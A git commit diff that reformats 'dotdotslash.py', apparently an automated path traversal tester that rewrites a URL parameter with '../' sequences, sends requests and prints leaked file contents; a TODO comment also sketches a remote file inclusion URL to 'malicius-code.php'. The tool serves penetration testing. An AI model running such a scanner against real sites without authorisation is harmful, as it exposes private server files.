e2e1bcaf828ed82e2cd894836aed5c879a6c8b17
Julio C. Stefanutto <jcesarstef@gmail.com>
2018-03-12 00:12:58 -0300

    A ghost called Pep 8

--- dotdotslash.py
+++ dotdotslash.py
@@ -6,10 +6,10 @@ from match import dotvar, match, befvar
 import requests
 from http.cookies import SimpleCookie
 
-#TODO
+# TODO
 # add -f --file
 # add --os
-# link to other site http://some_site.com.br/some-page?page=http://other-site.com.br/other-page.htm/malicius-code.php   
+# http://site.com.br/some-page?page=http://other-site.com.br/
 # use POST data
 # mutiple headers
 # solve 302 that turn 200
@@ -17,12 +17,12 @@ from http.cookies import SimpleCookie
 # colors on http_code
 # threads
 
-parser = argparse.ArgumentParser(description = 'dot dot slash - A automated Path Traversal Tester. Created by @jcesrstef.')
-parser.add_argument('--url', '-u',action = 'store', dest = 'url', required = True, help = 'Url to attack.')
-parser.add_argument('--string', '-s', action = 'store', dest = 'string', required = True, help = 'String in --url to attack. Ex: document.pdf')
-parser.add_argument('--cookie', '-c',action = 'store', dest = 'cookie', required = False, help = 'Document cookie.')
-parser.add_argument('--depth', '-d', action = 'store', dest = 'depth', required = False, type = int, default = '6', help = 'How deep we will go?')
-parser.add_argument('--verbose', '-v', action = 'store_true', required = False, help = 'Show requests')
+parser = argparse.ArgumentParser(description='dot dot slash - A automated Path Traversal Tester. Created by @jcesrstef.')
+parser.add_argument('--url', '-u', action='store', dest='url', required=True, help='Url to attack.')
+parser.add_argument('--string', '-s', action='store', dest='string', required=True, help='String in --url to attack. Ex: document.pdf')
+parser.add_argument('--cookie', '-c', action='store', dest='cookie', required=False, help='Document cookie.')
+parser.add_argument('--depth', '-d', action='store', dest='depth', required=False, type=int, default='6', help='How deep we will go?')
+parser.add_argument('--verbose', '-v', action='store_true', required=False, help='Show requests')
 arguments = parser.parse_args()
 
 banner = "\
@@ -36,68 +36,71 @@ Automated Path Traversal Tester\n\
 version 0.0.2\n\
 Created by Julio Cesar Stefanutto (@jcesarstef)\n\
 \n\
-Starting run in: \033[94m"+ arguments.url + "\033[0m\n\
+Starting run in: \033[94m" + arguments.url + "\033[0m\n\
 \
 "
 print(banner)
 
+
 class bcolors:
-	HEADER = '\033[95m'
-	OKBLUE = '\033[94m'
-	OKGREEN = '\033[92m'
-	WARNING = '\033[93m'
-	FAIL = '\033[91m'
-	ENDC = '\033[0m'
-	BOLD = '\033[1m'
-	UNDERLINE = '\033[4m'
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+
 
 class request(object):
-	def query(self, url, cookie=None):		
-		if cookie:
-			rawdata = "Cookie: " + cookie
-			cookie = SimpleCookie()
-			cookie.load(rawdata)
+    def query(self, url, cookie=None):
+        if cookie:
+            rawdata = "Cookie: " + cookie
+            cookie = SimpleCookie()
+            cookie.load(rawdata)
 
-		req = requests.get(url, cookies=cookie, allow_redirects=False)
-		self.raw = req.text
-		self.code = req.status_code
+        req = requests.get(url, cookies=cookie, allow_redirects=False)
+        self.raw = req.text
+        self.code = req.status_code
+
 
 def forloop():
-	if str(arguments.string) not in str(arguments.url):
-		sys.exit("String: " + bcolors.WARNING + arguments.string + bcolors.ENDC + " not found in url: " + bcolors.FAIL + arguments.url + "\n")
-		
-	count = 0
-	duplicate = []
-	while (count != (arguments.depth + 1)):
-		print("[+] Depth: "+ str(count))
-		for var in dotvar:
-			for bvar in befvar:
-				for word in match.keys():
-					rewrite = bvar + (var * count) + word
-					fullrewrite = re.sub(arguments.string,  rewrite, arguments.url)
+    if str(arguments.string) not in str(arguments.url):
+        sys.exit("String: " + bcolors.WARNING + arguments.string + bcolors.ENDC + " not found in url: " + bcolors.FAIL + arguments.url + "\n")
 
-					if fullrewrite not in duplicate:
-						req = request()
-						req.query(fullrewrite)
-						catchdata = re.findall(str(match[word]), req.raw)
-						if (len(catchdata) != 0):
-							print(bcolors.OKGREEN + "\n[" + str(req.code) + "] " + bcolors.ENDC + fullrewrite)
-							print(" Contents Found: " + str(len(catchdata)))
-						else:
-							if arguments.verbose:
-								print("[" + str(req.code) + "] " + fullrewrite)
+    count = 0
+    duplicate = []
+    while (count != (arguments.depth + 1)):
+        print("[+] Depth: " + str(count))
+        for var in dotvar:
+            for bvar in befvar:
+                for word in match.keys():
+                    rewrite = bvar + (var * count) + word
+                    fullrewrite = re.sub(arguments.string,  rewrite, arguments.url)
 
-						icount = 0
-						# Print match
-						for i in catchdata:
-							print(" " + bcolors.FAIL + str(i) + bcolors.ENDC)
-							icount = icount + 1
-							if (icount > 6):
-								print(" [...]")
-								break
-							if arguments.verbose:
-								time.sleep(0)
-					duplicate.append(fullrewrite)
-		count += 1
+                    if fullrewrite not in duplicate:
+                        req = request()
+                        req.query(fullrewrite)
+                        catchdata = re.findall(str(match[word]), req.raw)
+                        if (len(catchdata) != 0):
+                            print(bcolors.OKGREEN + "\n[" + str(req.code) + "] " + bcolors.ENDC + fullrewrite)
+                            print(" Contents Found: " + str(len(catchdata)))
+                        else:
+                            if arguments.verbose:
+                                print("[" + str(req.code) + "] " + fullrewrite)
+
+                        icount = 0
+                        # Print match
+                        for i in catchdata:
+                            print(" " + bcolors.FAIL + str(i) + bcolors.ENDC)
+                            icount = icount + 1
+                            if (icount > 6):
+                                print(" [...]")
+                                break
+                            if arguments.verbose:
+                                time.sleep(0)
+                    duplicate.append(fullrewrite)
+        count += 1
 
 forloop()
